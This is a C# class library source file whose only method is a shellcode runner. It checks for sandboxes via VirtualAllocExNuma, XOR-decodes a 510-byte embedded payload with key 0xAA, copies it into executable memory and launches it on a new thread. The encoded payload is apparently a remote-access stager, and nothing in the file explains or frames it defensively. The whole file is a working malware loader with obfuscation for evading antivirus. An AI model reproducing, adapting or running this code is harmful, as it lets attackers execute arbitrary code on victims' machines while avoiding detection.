﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ClassLibrary1
{
    public class Class1
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        public static void runner()
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            byte[] buf = new byte[510] {
0x56, 0xe2, 0x29, 0x4e, 0x5a, 0x42, 0x66, 0xaa, 0xaa, 0xaa, 0xeb, 0xfb, 0xeb, 0xfa, 0xf8, 0xfb, 0xe2, 0x9b, 0x78, 0xfc, 0xcf, 0xe2, 0x21, 0xf8, 0xca, 0xe2, 0x21, 0xf8, 0xb2, 0xe2, 0x21, 0xf8, 0x8a, 0xe7, 0x9b, 0x63, 0xe2, 0xa5, 0x1d, 0xe0, 0xe0, 0xe2, 0x21, 0xd8, 0xfa, 0xe2, 0x9b, 0x6a, 0x06, 0x96, 0xcb, 0xd6, 0xa8, 0x86, 0x8a, 0xeb, 0x6b, 0x63, 0xa7, 0xeb, 0xab, 0x6b, 0x48, 0x47, 0xf8, 0xeb, 0xfb, 0xe2, 0x21, 0xf8, 0x8a, 0x21, 0xe8, 0x96, 0xe2, 0xab, 0x7a, 0xcc, 0x2b, 0xd2, 0xb2, 0xa1, 0xa8, 0xa5, 0x2f, 0xd8, 0xaa, 0xaa, 0xaa, 0x21, 0x2a, 0x22, 0xaa, 0xaa, 0xaa, 0xe2, 0x2f, 0x6a, 0xde, 0xcd, 0xe2, 0xab, 0x7a, 0xee, 0x21, 0xea, 0x8a, 0xfa, 0x21, 0xe2, 0xb2, 0xe3, 0xab, 0x7a, 0x49, 0xfc, 0xe7, 0x9b, 0x63, 0xe2, 0x55, 0x63, 0xeb, 0x21, 0x9e, 0x22, 0xe2, 0xab, 0x7c, 0xe2, 0x9b, 0x6a, 0xeb, 0x6b, 0x63, 0xa7, 0x06, 0xeb, 0xab, 0x6b, 0x92, 0x4a, 0xdf, 0x5b, 0xe6, 0xa9, 0xe6, 0x8e, 0xa2, 0xef, 0x93, 0x7b, 0xdf, 0x72, 0xf2, 0xee, 0x21, 0xea, 0x8e, 0xe3, 0xab, 0x7a, 0xcc, 0xeb, 0x21, 0xa6, 0xe2, 0xee, 0x21, 0xea, 0xb6, 0xe3, 0xab, 0x7a, 0xeb, 0x21, 0xae, 0x22, 0xeb, 0xf2, 0xe2, 0xab, 0x7a, 0xeb, 0xf2, 0xf4, 0xf3, 0xf0, 0xeb, 0xf2, 0xeb, 0xf3, 0xeb, 0xf0, 0xe2, 0x29, 0x46, 0x8a, 0xeb, 0xf8, 0x55, 0x4a, 0xf2, 0xeb, 0xf3, 0xf0, 0xe2, 0x21, 0xb8, 0x43, 0xe1, 0x55, 0x55, 0x55, 0xf7, 0xe3, 0x14, 0xdd, 0xd9, 0x98, 0xf5, 0x99, 0x98, 0xaa, 0xaa, 0xeb, 0xfc, 0xe3, 0x23, 0x4c, 0xe2, 0x2b, 0x46, 0x0a, 0xab, 0xaa, 0xaa, 0xe3, 0x23, 0x4f, 0xe3, 0x16, 0xa8, 0xaa, 0xaa, 0x9f, 0x6a, 0x02, 0x9b, 0x9d, 0xeb, 0xfe, 0xe3, 0x23, 0x4e, 0xe6, 0x23, 0x5b, 0xeb, 0x10, 0xe6, 0xdd, 0x8c, 0xad, 0x55, 0x7f, 0xe6, 0x23, 0x40, 0xc2, 0xab, 0xab, 0xaa, 0xaa, 0xf3, 0xeb, 0x10, 0x83, 0x2a, 0xc1, 0xaa, 0x55, 0x7f, 0xc0, 0xa0, 0xeb, 0xf4, 0xfa, 0xfa, 0xe7, 0x9b, 0x63, 0xe7, 0x9b, 0x6a, 0xe2, 0x55, 0x6a, 0xe2, 0x23, 0x68, 0xe2, 0x55, 0x6a, 0xe2, 0x23, 0x6b, 0xeb, 0x10, 0x40, 0xa5, 0x75, 0x4a, 0x55, 0x7f, 0xe2, 0x23, 0x6d, 0xc0, 0xba, 0xeb, 0xf2, 0xe6, 0x23, 0x48, 0xe2, 0x23, 0x53, 0xeb, 0x10, 0x33, 0x0f, 0xde, 0xcb, 0x55, 0x7f, 0x2f, 0x6a, 0xde, 0xa0, 0xe3, 0x55, 0x64, 0xdf, 0x4f, 0x42, 0x39, 0xaa, 0xaa, 0xaa, 0xe2, 0x29, 0x46, 0xba, 0xe2, 0x23, 0x48, 0xe7, 0x9b, 0x63, 0xc0, 0xae, 0xeb, 0xf2, 0xe2, 0x23, 0x53, 0xeb, 0x10, 0xa8, 0x73, 0x62, 0xf5, 0x55, 0x7f, 0x29, 0x52, 0xaa, 0xd4, 0xff, 0xe2, 0x29, 0x6e, 0x8a, 0xf4, 0x23, 0x5c, 0xc0, 0xea, 0xeb, 0xf3, 0xc2, 0xaa, 0xba, 0xaa, 0xaa, 0xeb, 0xf2, 0xe2, 0x23, 0x58, 0xe2, 0x9b, 0x63, 0xeb, 0x10, 0xf2, 0x0e, 0xf9, 0x4f, 0x55, 0x7f, 0xe2, 0x23, 0x69, 0xe3, 0x23, 0x6d, 0xe7, 0x9b, 0x63, 0xe3, 0x23, 0x5a, 0xe2, 0x23, 0x70, 0xe2, 0x23, 0x53, 0xeb, 0x10, 0xa8, 0x73, 0x62, 0xf5, 0x55, 0x7f, 0x29, 0x52, 0xaa, 0xd7, 0x82, 0xf2, 0xeb, 0xfd, 0xf3, 0xc2, 0xaa, 0xea, 0xaa, 0xaa, 0xeb, 0xf2, 0xc0, 0xaa, 0xf0, 0xeb, 0x10, 0xa1, 0x85, 0xa5, 0x9a, 0x55, 0x7f, 0xfd, 0xf3, 0xeb, 0x10, 0xdf, 0xc4, 0xe7, 0xcb, 0x55, 0x7f, 0xe3, 0x55, 0x64, 0x43, 0x96, 0x55, 0x55, 0x55, 0xe2, 0xab, 0x69, 0xe2, 0x83, 0x6c, 0xe2, 0x2f, 0x5c, 0xdf, 0x1e, 0xeb, 0x55, 0x4d, 0xf2, 0xc0, 0xaa, 0xf3, 0xe3, 0x6d, 0x68, 0x5a, 0x1f, 0x08, 0xfc, 0x55, 0x7f};

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] ^ 0xAA) & 0xFF);
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
